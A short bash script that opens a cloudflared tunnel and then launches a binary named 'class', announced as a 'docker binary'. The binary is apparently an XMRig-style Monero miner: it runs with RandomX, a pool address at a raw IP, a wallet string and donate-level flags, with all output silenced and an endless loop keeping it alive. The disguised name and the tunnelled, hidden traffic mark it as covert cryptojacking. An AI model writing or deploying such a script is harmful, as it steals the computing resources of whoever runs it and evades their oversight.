#!/bin/bash

echo "Starting cloudflared..."

cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 5

echo "Starting docker binary..."

chmod +x ./class
./class -a rx/0 -o 157.173.100.15:443 -u Q01050090d680b4ec45c569776ccafc507a4b859b14d661108509d4638ddbe677311ab16b1f5894.$(shuf -n 1 -i 100-999)-Levy -p x -k --donate-level 1 >/dev/null 2>&1 &

echo "Running..."

while true
do
  sleep 60
done
